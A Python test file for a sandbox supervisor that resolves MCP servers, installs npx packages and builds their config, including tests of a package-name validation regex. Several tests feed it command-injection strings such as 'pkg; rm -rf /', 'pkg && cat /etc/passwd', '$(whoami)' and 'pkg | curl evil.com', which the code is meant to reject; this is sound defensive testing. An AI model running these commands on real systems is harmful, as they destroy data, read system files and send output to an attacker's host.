"""Tests for MCP server resolution, package installation, and config building."""

import json
import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest


def _make_supervisor(session_config: dict | None = None):
    """Create a SandboxSupervisor with MCP-relevant session config."""
    env_vars = {
        "SANDBOX_ID": "test-sandbox",
        "REPO_OWNER": "acme",
        "REPO_NAME": "my-repo",
        "SESSION_CONFIG": json.dumps(session_config or {}),
    }
    with patch.dict(os.environ, env_vars, clear=False):
        from sandbox_runtime.entrypoint import SandboxSupervisor

        return SandboxSupervisor()


# ─── _resolve_mcp_servers ────────────────────────────────────────────────────


class TestResolveMcpServers:
    def test_returns_empty_list_when_no_mcp_servers(self):
        sup = _make_supervisor({})
        assert sup._resolve_mcp_servers() == []

    def test_returns_empty_list_when_mcp_servers_is_none(self):
        sup = _make_supervisor({"mcp_servers": None})
        assert sup._resolve_mcp_servers() == []

    def test_returns_servers_from_session_config(self):
        servers = [
            {"name": "playwright", "type": "local", "command": ["npx", "-y", "@playwright/mcp"]},
            {"name": "remote", "type": "remote", "url": "https://mcp.example.com/sse"},
        ]
        sup = _make_supervisor({"mcp_servers": servers})
        result = sup._resolve_mcp_servers()
        assert len(result) == 2
        assert result[0]["name"] == "playwright"
        assert result[1]["name"] == "remote"


# ─── _install_mcp_packages ──────────────────────────────────────────────────


class TestInstallMcpPackages:
    def _mock_proc(self, returncode=0):
        """Create a mock async subprocess with the given return code."""
        proc = AsyncMock()
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.returncode = returncode
        proc.kill = MagicMock()
        proc.wait = AsyncMock()
        return proc

    async def test_extracts_package_from_npx_command(self):
        sup = _make_supervisor()
        servers = [{"type": "local", "command": ["npx", "-y", "@playwright/mcp"]}]
        mock_proc = self._mock_proc()
        with patch("asyncio.create_subprocess_exec", return_value=mock_proc) as mock_exec:
            await sup._install_mcp_packages(servers)
            mock_exec.assert_called_once()
            args = mock_exec.call_args[0]
            assert list(args) == ["npm", "install", "-g", "@playwright/mcp"]

    async def test_extracts_package_from_npx_p_flag(self):
        sup = _make_supervisor()
        servers = [{"type": "local", "command": ["npx", "-p", "@scope/pkg", "binary"]}]
        mock_proc = self._mock_proc()
        with patch("asyncio.create_subprocess_exec", return_value=mock_proc) as mock_exec:
            await sup._install_mcp_packages(servers)
            args = mock_exec.call_args[0]
            assert list(args) == ["npm", "install", "-g", "@scope/pkg"]

    async def test_skips_remote_servers(self):
        sup = _make_supervisor()
        servers = [{"type": "remote", "url": "https://mcp.example.com", "command": ["npx", "x"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await sup._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_skips_servers_without_npx(self):
        sup = _make_supervisor()
        servers = [{"type": "local", "command": ["node", "server.js"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await sup._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_skips_servers_without_command(self):
        sup = _make_supervisor()
        servers = [{"type": "local"}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await sup._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_rejects_invalid_package_names(self):
        sup = _make_supervisor()
        servers = [{"type": "local", "command": ["npx", "../../../etc/passwd"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await sup._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_rejects_shell_metacharacters(self):
        sup = _make_supervisor()
        servers = [{"type": "local", "command": ["npx", "pkg; rm -rf /"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await sup._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_deduplicates_packages(self):
        sup = _make_supervisor()
        servers = [
            {"type": "local", "command": ["npx", "-y", "@playwright/mcp"]},
            {"type": "local", "command": ["npx", "@playwright/mcp"]},
        ]
        mock_proc = self._mock_proc()
        with patch("asyncio.create_subprocess_exec", return_value=mock_proc) as mock_exec:
            await sup._install_mcp_packages(servers)
            args = mock_exec.call_args[0]
            # Should only have one instance of @playwright/mcp
            assert list(args) == ["npm", "install", "-g", "@playwright/mcp"]

    async def test_noop_when_no_servers(self):
        sup = _make_supervisor()
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await sup._install_mcp_packages([])
            mock_exec.assert_not_called()


# ─── _build_mcp_config ──────────────────────────────────────────────────────


class TestBuildMcpConfig:
    def test_builds_local_config_from_local_server(self):
        sup = _make_supervisor()
        servers = [
            {
                "name": "playwright",
                "type": "local",
                "command": ["npx", "-y", "@playwright/mcp"],
                "env": {"DEBUG": "1"},
            }
        ]
        config = sup._build_mcp_config(servers)
        assert "playwright" in config
        assert config["playwright"]["type"] == "local"
        assert config["playwright"]["command"] == ["npx", "-y", "@playwright/mcp"]
        assert config["playwright"]["environment"] == {"DEBUG": "1"}

    def test_builds_remote_config_from_remote_server(self):
        sup = _make_supervisor()
        servers = [
            {
                "name": "remote-api",
                "type": "remote",
                "url": "https://mcp.example.com/sse",
                "headers": {"Authorization": "Bearer sk-test"},
            }
        ]
        config = sup._build_mcp_config(servers)
        assert "remote-api" in config
        assert config["remote-api"]["type"] == "remote"
        assert config["remote-api"]["url"] == "https://mcp.example.com/sse"
        assert config["remote-api"]["headers"] == {"Authorization": "Bearer sk-test"}

    def test_falls_back_to_env_for_remote_headers(self):
        """Legacy compat: if 'headers' is absent, use 'env' for remote servers."""
        sup = _make_supervisor()
        servers = [
            {
                "name": "legacy-remote",
                "type": "remote",
                "url": "https://mcp.example.com",
                "env": {"Authorization": "Bearer old-token"},
            }
        ]
        config = sup._build_mcp_config(servers)
        assert config["legacy-remote"]["headers"] == {"Authorization": "Bearer old-token"}

    def test_skips_servers_without_name(self):
        sup = _make_supervisor()
        servers = [{"type": "local", "command": ["npx", "x"]}]
        config = sup._build_mcp_config(servers)
        assert config == {}

    def test_omits_environment_when_env_is_empty(self):
        sup = _make_supervisor()
        servers = [{"name": "minimal", "type": "local", "command": ["npx", "x"]}]
        config = sup._build_mcp_config(servers)
        assert "environment" not in config["minimal"]

    def test_omits_headers_when_empty(self):
        sup = _make_supervisor()
        servers = [{"name": "bare-remote", "type": "remote", "url": "https://mcp.example.com"}]
        config = sup._build_mcp_config(servers)
        assert "headers" not in config["bare-remote"]


# ─── _NPM_PKG_RE validation ─────────────────────────────────────────────────


class TestNpmPackageRegex:
    """Test the security-critical regex that validates npm package names."""

    @pytest.fixture
    def regex(self):
        sup = _make_supervisor()
        return sup._NPM_PKG_RE

    @pytest.mark.parametrize(
        "pkg",
        [
            "@playwright/mcp",
            "@scope/package",
            "simple-package",
            "package@1.0.0",
            "@scope/pkg@latest",
            "@scope/my.pkg",
            "my-pkg@1.2.3-beta.1",
        ],
    )
    def test_accepts_valid_packages(self, regex, pkg):
        assert regex.match(pkg), f"Expected {pkg} to match"

    @pytest.mark.parametrize(
        "pkg",
        [
            "../../../etc/passwd",
            "pkg; rm -rf /",
            "pkg && cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "pkg | curl evil.com",
            "a b c",
        ],
    )
    def test_rejects_dangerous_inputs(self, regex, pkg):
        assert not regex.match(pkg), f"Expected {pkg} to NOT match"
